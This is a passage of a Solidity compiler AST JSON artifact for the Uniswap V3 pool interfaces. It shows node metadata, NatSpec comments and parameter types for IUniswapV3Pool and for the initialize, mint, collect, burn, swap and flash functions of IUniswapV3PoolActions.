													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "4009:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3996:31:1"
									},
									"returnParameters": {
										"id": 1270,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4036:0:1"
									},
									"scope": 1272,
									"src": "3972:65:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1273,
							"src": "234:3805:1",
							"usedErrors": [],
							"usedEvents": [
								1199,
								1212,
								1219
							]
						}
					],
					"src": "45:3995:1"
				},
				"id": 1
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
					"exportedSymbols": {
						"IUniswapV3Pool": [
							1294
						],
						"IUniswapV3PoolActions": [
							1390
						],
						"IUniswapV3PoolDerivedState": [
							1421
						],
						"IUniswapV3PoolEvents": [
							1540
						],
						"IUniswapV3PoolImmutables": [
							1580
						],
						"IUniswapV3PoolOwnerActions": [
							1606
						],
						"IUniswapV3PoolState": [
							1714
						]
					},
					"id": 1295,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1274,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:2"
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
							"file": "./pool/IUniswapV3PoolImmutables.sol",
							"id": 1275,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1295,
							"sourceUnit": 1581,
							"src": "71:45:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
							"file": "./pool/IUniswapV3PoolState.sol",
							"id": 1276,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1295,
							"sourceUnit": 1715,
							"src": "117:40:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
							"file": "./pool/IUniswapV3PoolDerivedState.sol",
							"id": 1277,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1295,
							"sourceUnit": 1422,
							"src": "158:47:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
							"file": "./pool/IUniswapV3PoolActions.sol",
							"id": 1278,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1295,
							"sourceUnit": 1391,
							"src": "206:42:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
							"file": "./pool/IUniswapV3PoolOwnerActions.sol",
							"id": 1279,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1295,
							"sourceUnit": 1607,
							"src": "249:47:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
							"file": "./pool/IUniswapV3PoolEvents.sol",
							"id": 1280,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 1295,
							"sourceUnit": 1541,
							"src": "297:41:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"baseName": {
										"id": 1282,
										"name": "IUniswapV3PoolImmutables",
										"nameLocations": [
											"637:24:2"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 1580,
										"src": "637:24:2"
									},
									"id": 1283,
									"nodeType": "InheritanceSpecifier",
									"src": "637:24:2"
								},
								{
									"baseName": {
										"id": 1284,
										"name": "IUniswapV3PoolState",
										"nameLocations": [
											"667:19:2"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 1714,
										"src": "667:19:2"
									},
									"id": 1285,
									"nodeType": "InheritanceSpecifier",
									"src": "667:19:2"
								},
								{
									"baseName": {
										"id": 1286,
										"name": "IUniswapV3PoolDerivedState",
										"nameLocations": [
											"692:26:2"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 1421,
										"src": "692:26:2"
									},
									"id": 1287,
									"nodeType": "InheritanceSpecifier",
									"src": "692:26:2"
								},
								{
									"baseName": {
										"id": 1288,
										"name": "IUniswapV3PoolActions",
										"nameLocations": [
											"724:21:2"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 1390,
										"src": "724:21:2"
									},
									"id": 1289,
									"nodeType": "InheritanceSpecifier",
									"src": "724:21:2"
								},
								{
									"baseName": {
										"id": 1290,
										"name": "IUniswapV3PoolOwnerActions",
										"nameLocations": [
											"751:26:2"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 1606,
										"src": "751:26:2"
									},
									"id": 1291,
									"nodeType": "InheritanceSpecifier",
									"src": "751:26:2"
								},
								{
									"baseName": {
										"id": 1292,
										"name": "IUniswapV3PoolEvents",
										"nameLocations": [
											"783:20:2"
										],
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 1540,
										"src": "783:20:2"
									},
									"id": 1293,
									"nodeType": "InheritanceSpecifier",
									"src": "783:20:2"
								}
							],
							"canonicalName": "IUniswapV3Pool",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1281,
								"nodeType": "StructuredDocumentation",
								"src": "340:265:2",
								"text": "@title The interface for a Uniswap V3 Pool\n @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n to the ERC20 specification\n @dev The pool interface is broken up into many smaller pieces"
							},
							"fullyImplemented": false,
							"id": 1294,
							"linearizedBaseContracts": [
								1294,
								1540,
								1606,
								1390,
								1421,
								1714,
								1580
							],
							"name": "IUniswapV3Pool",
							"nameLocation": "615:14:2",
							"nodeType": "ContractDefinition",
							"nodes": [],
							"scope": 1295,
							"src": "605:203:2",
							"usedErrors": [],
							"usedEvents": [
								1431,
								1448,
								1463,
								1478,
								1495,
								1510,
								1517,
								1528,
								1539
							]
						}
					],
					"src": "45:764:2"
				},
				"id": 2
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"ast": {
					"absolutePath": "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolActions": [
							1390
						]
					},
					"id": 1391,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1296,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:3"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IUniswapV3PoolActions",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1297,
								"nodeType": "StructuredDocumentation",
								"src": "71:102:3",
								"text": "@title Permissionless pool actions\n @notice Contains pool methods that can be called by anyone"
							},
							"fullyImplemented": false,
							"id": 1390,
							"linearizedBaseContracts": [
								1390
							],
							"name": "IUniswapV3PoolActions",
							"nameLocation": "183:21:3",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"documentation": {
										"id": 1298,
										"nodeType": "StructuredDocumentation",
										"src": "211:206:3",
										"text": "@notice Sets the initial price for the pool\n @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96"
									},
									"functionSelector": "f637731d",
									"id": 1303,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nameLocation": "431:10:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1301,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1300,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nameLocation": "450:12:3",
												"nodeType": "VariableDeclaration",
												"scope": 1303,
												"src": "442:20:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1299,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "442:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "441:22:3"
									},
									"returnParameters": {
										"id": 1302,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "472:0:3"
									},
									"scope": 1390,
									"src": "422:51:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1304,
										"nodeType": "StructuredDocumentation",
										"src": "479:1029:3",
										"text": "@notice Adds liquidity for the given recipient/tickLower/tickUpper position\n @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n on tickLower, tickUpper, the amount of liquidity, and the current price.\n @param recipient The address for which the liquidity will be created\n @param tickLower The lower tick of the position in which to add liquidity\n @param tickUpper The upper tick of the position in which to add liquidity\n @param amount The amount of liquidity to mint\n @param data Any data that should be passed through to the callback\n @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
									},
									"functionSelector": "3c8a7d8d",
									"id": 1321,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "mint",
									"nameLocation": "1522:4:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1315,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1306,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "1544:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1321,
												"src": "1536:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1305,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1536:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1308,
												"mutability": "mutable",
												"name": "tickLower",
												"nameLocation": "1569:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1321,
												"src": "1563:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1307,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1563:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1310,
												"mutability": "mutable",
												"name": "tickUpper",
												"nameLocation": "1594:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1321,
												"src": "1588:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1309,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1588:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1312,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "1621:6:3",
												"nodeType": "VariableDeclaration",
												"scope": 1321,
												"src": "1613:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1311,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1613:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1314,
												"mutability": "mutable",
												"name": "data",
												"nameLocation": "1652:4:3",
												"nodeType": "VariableDeclaration",
												"scope": 1321,
												"src": "1637:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1313,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "1637:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1526:136:3"
									},
									"returnParameters": {
										"id": 1320,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1317,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "1689:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1321,
												"src": "1681:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1316,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1681:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1319,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "1706:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1321,
												"src": "1698:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1318,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1698:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1680:34:3"
									},
									"scope": 1390,
									"src": "1513:202:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1322,
										"nodeType": "StructuredDocumentation",
										"src": "1721:1053:3",
										"text": "@notice Collects tokens owed to a position\n @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n @param recipient The address which should receive the fees collected\n @param tickLower The lower tick of the position for which to collect fees\n @param tickUpper The upper tick of the position for which to collect fees\n @param amount0Requested How much token0 should be withdrawn from the fees owed\n @param amount1Requested How much token1 should be withdrawn from the fees owed\n @return amount0 The amount of fees collected in token0\n @return amount1 The amount of fees collected in token1"
									},
									"functionSelector": "4f1eb3d8",
									"id": 1339,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collect",
									"nameLocation": "2788:7:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1333,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1324,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "2813:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1339,
												"src": "2805:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1323,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2805:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1326,
												"mutability": "mutable",
												"name": "tickLower",
												"nameLocation": "2838:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1339,
												"src": "2832:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1325,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2832:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1328,
												"mutability": "mutable",
												"name": "tickUpper",
												"nameLocation": "2863:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1339,
												"src": "2857:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1327,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2857:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1330,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nameLocation": "2890:16:3",
												"nodeType": "VariableDeclaration",
												"scope": 1339,
												"src": "2882:24:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1329,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2882:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1332,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nameLocation": "2924:16:3",
												"nodeType": "VariableDeclaration",
												"scope": 1339,
												"src": "2916:24:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1331,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2916:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2795:151:3"
									},
									"returnParameters": {
										"id": 1338,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1335,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "2973:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1339,
												"src": "2965:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1334,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2965:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1337,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "2990:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1339,
												"src": "2982:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1336,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2982:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2964:34:3"
									},
									"scope": 1390,
									"src": "2779:220:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1340,
										"nodeType": "StructuredDocumentation",
										"src": "3005:631:3",
										"text": "@notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n @dev Fees must be collected separately via a call to #collect\n @param tickLower The lower tick of the position for which to burn liquidity\n @param tickUpper The upper tick of the position for which to burn liquidity\n @param amount How much liquidity to burn\n @return amount0 The amount of token0 sent to the recipient\n @return amount1 The amount of token1 sent to the recipient"
									},
									"functionSelector": "a34123a7",
									"id": 1353,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "burn",
									"nameLocation": "3650:4:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1347,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1342,
												"mutability": "mutable",
												"name": "tickLower",
												"nameLocation": "3670:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1353,
												"src": "3664:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1341,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3664:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1344,
												"mutability": "mutable",
												"name": "tickUpper",
												"nameLocation": "3695:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1353,
												"src": "3689:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1343,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3689:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1346,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "3722:6:3",
												"nodeType": "VariableDeclaration",
												"scope": 1353,
												"src": "3714:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1345,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "3714:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3654:80:3"
									},
									"returnParameters": {
										"id": 1352,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1349,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "3761:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1353,
												"src": "3753:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1348,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3753:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1351,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "3778:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1353,
												"src": "3770:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1350,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3770:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3752:34:3"
									},
									"scope": 1390,
									"src": "3641:146:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1354,
										"nodeType": "StructuredDocumentation",
										"src": "3793:1015:3",
										"text": "@notice Swap token0 for token1, or token1 for token0\n @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n @param recipient The address to receive the output of the swap\n @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n value after the swap. If one for zero, the price cannot be greater than this value after the swap\n @param data Any data to be passed through to the callback\n @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
									},
									"functionSelector": "128acb08",
									"id": 1371,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nameLocation": "4822:4:3",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1365,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1356,
												"mutability": "mutable",
												"name": "recipient",
												"nameLocation": "4844:9:3",
												"nodeType": "VariableDeclaration",
												"scope": 1371,
												"src": "4836:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1355,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4836:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1358,
												"mutability": "mutable",
												"name": "zeroForOne",
												"nameLocation": "4868:10:3",
												"nodeType": "VariableDeclaration",
												"scope": 1371,
												"src": "4863:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1357,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4863:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1360,
												"mutability": "mutable",
												"name": "amountSpecified",
												"nameLocation": "4895:15:3",
												"nodeType": "VariableDeclaration",
												"scope": 1371,
												"src": "4888:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1359,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4888:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1362,
												"mutability": "mutable",
												"name": "sqrtPriceLimitX96",
												"nameLocation": "4928:17:3",
												"nodeType": "VariableDeclaration",
												"scope": 1371,
												"src": "4920:25:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1361,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4920:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1364,
												"mutability": "mutable",
												"name": "data",
												"nameLocation": "4970:4:3",
												"nodeType": "VariableDeclaration",
												"scope": 1371,
												"src": "4955:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1363,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "4955:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4826:154:3"
									},
									"returnParameters": {
										"id": 1370,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1367,
												"mutability": "mutable",
												"name": "amount0",
												"nameLocation": "5006:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1371,
												"src": "4999:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1366,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4999:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1369,
												"mutability": "mutable",
												"name": "amount1",
												"nameLocation": "5022:7:3",
												"nodeType": "VariableDeclaration",
												"scope": 1371,
												"src": "5015:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1368,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "5015:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4998:32:3"
									},
									"scope": 1390,
									"src": "4813:218:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 1372,
										"nodeType": "StructuredDocumentation",
										"src": "5037:657:3",
										"text": "@notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n with 0 amount{0,1} and sending the donation amount(s) from the callback\n @param recipient The address which will receive the token0 and token1 amounts\n @param amount0 The amount of token0 to send\n @param amount1 The amount of token1 to send\n @param data Any data to be passed through to the callback"
									},
									"functionSelector": "490e6cbc",
